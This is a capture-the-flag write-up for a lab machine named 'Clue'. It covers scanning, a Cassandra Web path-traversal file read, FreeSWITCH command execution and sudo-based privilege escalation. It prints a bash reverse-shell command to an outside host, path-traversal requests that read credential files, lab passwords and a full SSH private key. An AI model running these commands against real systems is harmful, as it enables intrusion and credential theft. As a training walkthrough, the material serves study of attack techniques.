# CTF Writeup: Clue

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.198.240
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 22:46 EST
Nmap scan report for 192.168.198.240
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2025-12-22T22:47:20-05:00
| smb2-time: 
|   date: 2025-12-23T03:47:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.75 ms 192.168.45.1
2   27.73 ms 192.168.45.254
3   27.94 ms 192.168.251.1
4   27.97 ms 192.168.198.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.10 seconds
```

There seems to be multiple webpages running on port 80 & on port 3000.
The website on port 80 prohibits access to it, since we don't have the permissions to access the site.

Therefore let's analyze the webpage on port 3000.

The website seems to be running the "Cassandra Web" Application. Which displays information about an datacenter & system information.

## Vulnerability Assessment

Let's search up for exploits for Cassandra Web.

There seems to be only an Remote File Read Vulnerability in place.

```
searchsploit Cassandra              
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow                 | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                                       | linux/webapps/49362.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Judging from intuition this will be not the attack vector, in which we gain access to the server.
Let's move on to the last service running on 8021.

We found an command execution exploit for the FreeSWITCH application which let's us execute commands on the server.

```
wget https://www.exploit-db.com/raw/47799
```

When running the exploit, we get told that the authentication failed, this is because the exploit itself is utilizing default credentials of the FreeSWITCH application and those seem to not work.

```
python3 freeswitch-exploit.py 192.168.198.240 whoami  
Authentication failed
```

I found another default password for the application "1234" & blank, but those also didn't seem to work. I'm assuming we can find the password somewhere else, we didn't checkout smb yet. Let's first enumerate shares anonymously.

```
smbclient -L \\\\192.168.198.240     
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP
```

As we can see there is an interesting non-default share called "backup". Let's try & access it anonymously.

We were able to access the share anonymously & found 2 directories for the cassandra & freeswitch application.
Since we want to try and utilize the command execution exploit for the freeswitch application, we will need to find out the password. Let's further enumerate the freeswitch share.

```
smbclient \\\\192.168.198.240/backup
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  5 04:43:50 2022
  ..                                  D        0  Fri Aug  5 04:43:44 2022
  freeswitch                          D        0  Fri Aug  5 04:43:51 2022
  cassandra                           D        0  Fri May  6 11:04:47 2022
```

The freeswitch directory is rather interesting, because it has multiple server directories stored.

```
smb: \freeswitch\> ls
  .                                   D        0  Fri Aug  5 04:43:51 2022
  ..                                  D        0  Fri Aug  5 04:43:50 2022
  usr                                 D        0  Sun Oct 24 13:26:29 2021
  var                                 D        0  Sun Oct 24 13:26:29 2021
  etc                                 D        0  Fri Aug  5 04:43:51 2022
```

Since we made our research earlier about default passwords for the freeswitch application we also found out that the freeswitch password is always stored in /etc/freeswitch/config.

Let's download the config file locally and enumerate it.

```
smb: \freeswitch\etc\freeswitch\> get config.FS0 
getting file \freeswitch\etc\freeswitch\config.FS0 of size 2260 as config.FS0 (18.5 KiloBytes/sec) (average 18.5 KiloBytes/sec)
```

The config file didn't provide any password. Let's download the entire directory & enumerate further.

```
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

## Initial Access

We know that we can retrieve the password in /etc/freeswitch/autoload_configs/event_socket.conf.xml, but in the file we retrieved, there seems to be only the default password saved. Since we can't proceed further, let's start from the beginning maybe the remote file read exploit from the "Cassandra Web" application seems to work.

Ran the exploit and it successfully showed us the users on the server stored in the /etc/passwd file.

```
python3 cassandra-exploit.py 192.168.150.240 -p 3000 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

Let's try and find the password for our user now!

```
python3 cassandra-exploit.py 192.168.150.240 -p 3000 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

That's it we got the password! Let's modify the password variable in the freeswitch exploit now & run it.

Running the exploit worked!

```
python3 freeswitch-exploit.py 192.168.150.240 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

freeswitch
```

Let's get RCE now.

Let's first start up an netcat listener on port 80.

```
nc -lvnp 80
```

I ran the exploit with the following bash command.

```
python3 freeswitch-exploit.py 192.168.150.240 "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/80 0>&1'"
Authenticated
```

Gained RCE as user "freeswitch".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.150.240] 38264
bash: cannot set terminal process group (533): Inappropriate ioctl for device
bash: no job control in this shell
freeswitch@clue:/$
```

## Privilege Escalation

There seems to be 3 users on the server.

```
freeswitch@clue:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
cassie:x:1000:1000::/home/cassie:/bin/bash
anthony:x:1001:1001::/home/anthony:/bin/bash
```

Enumerating SUID Binaries.

```
freeswitch@clue:/$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

In order to find the password of user "cassie", we will have to find out where user passwords are stored in the Cassandra Web Application.

According to the initial Remote File Read exploit passwords are stored in /proc/self/cmdline

It's very odd. We weren't able to view the file properly on the shell. But using the Remote File Read Exploit, we retrieved the password of user cassie.

```
python3 cassandra-exploit.py 192.168.150.240 /proc/self/cmdline

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

Let's perform lateral movement and ssh into the server using user "cassie".

This didn't work out somehow. I'm assuming it's configured that it requires having an private key.

Let's just login into the user on our current shell.

```
freeswitch@clue:/proc/self$ su cassie
Password: SecondBiteTheApple330
cassie@clue:/proc/2189$
```

Retrieved the private key of cassie.

```
cassie@clue:~$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Let's save it to our local machine and access the server via ssh.

Didn't work aswell! Very odd.

Let's move on further without upgrading our shell.

We can see that user "cassie" is able to run the cassandra-web binary with root rights and without required authentication.

```
cassie@clue:~$ sudo -l
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

Which means we are able to start another cassandra-web service, which is also vulnerable to the remote file read exploit.

```
cassie@clue:~$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
< -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
I, [2025-12-23T01:28:14.284411 #2668]  INFO -- : Establishing control connection
I, [2025-12-23T01:28:14.358754 #2668]  INFO -- : Refreshing connected host's metadata
I, [2025-12-23T01:28:14.361757 #2668]  INFO -- : Completed refreshing connected host's metadata
I, [2025-12-23T01:28:14.362258 #2668]  INFO -- : Refreshing peers metadata
I, [2025-12-23T01:28:14.362996 #2668]  INFO -- : Completed refreshing peers metadata
I, [2025-12-23T01:28:14.363021 #2668]  INFO -- : Refreshing schema
I, [2025-12-23T01:28:14.388602 #2668]  INFO -- : Schema refreshed
I, [2025-12-23T01:28:14.388636 #2668]  INFO -- : Control connection established
I, [2025-12-23T01:28:14.388790 #2668]  INFO -- : Creating session
I, [2025-12-23T01:28:14.490116 #2668]  INFO -- : Session created
2025-12-23 01:28:14 -0500 Thin web server (v1.8.1 codename Infinite Smoothie)
2025-12-23 01:28:14 -0500 Maximum connections set to 1024
2025-12-23 01:28:14 -0500 Listening on 0.0.0.0:4444, CTRL+C to stop
```

We started up the service on port 8888. Let's utilize the exploit now in order to read the /root directory and maybe gain the private key of the "root" user.

Before running the exploit, we will have to modify the port of the exploit from 3000 to 8888.

Unfortunately this didn't work. I'm assuming I have to abuse the LFI internally. Therefore I will utilize another shell as user cassie and perform the file read there.

I started up my listener on port 3000 (other's are getting blocked by firewall)

```
nc -lvnp 3000
```

and utilized the freeswitch exploit with port 3000 and gained RCE and logged into cassie again.

```
python3 freeswitch-exploit.py 192.168.150.240 "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/3000 0>&1'"
```

I enumerated the /home/cassie directory & checked out the user "anthony" .bash_history file, which clearly stated that anthony's id_rsa file is the same privat key as the one from the root user.

```
cassie@clue:/$ curl --path-as-is localhost:4444/../../../../../../../../home/anthony/.bash_history
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit
```

Downloaded the private key of user "anthony" (root) onto our local machine.

```
cassie@clue:/$ curl --path-as-is localhost:4444/../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Logged into ssh as root user.

```
ssh -i id_rsa root@192.168.150.240                  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~#
```

Retrieved proof.txt in /root directory.

```
root@clue:~# cat proof.txt
The proof is in another file
```

Retrieved proof_youtriedharder.txt in /root directory.

```
5349b4981609f13bf8ac146422545969
```

Retrieved local.txt in /var/lib/freeswitch directory.

```
root@clue:/home/anthony# find / -iname "local.txt" 2>/dev/null
/var/lib/freeswitch/local.txt
root@clue:/home/anthony# cat /var/lib/freeswitch/local.txt
b5bcc859e50e43500585d680f708ac7d
```
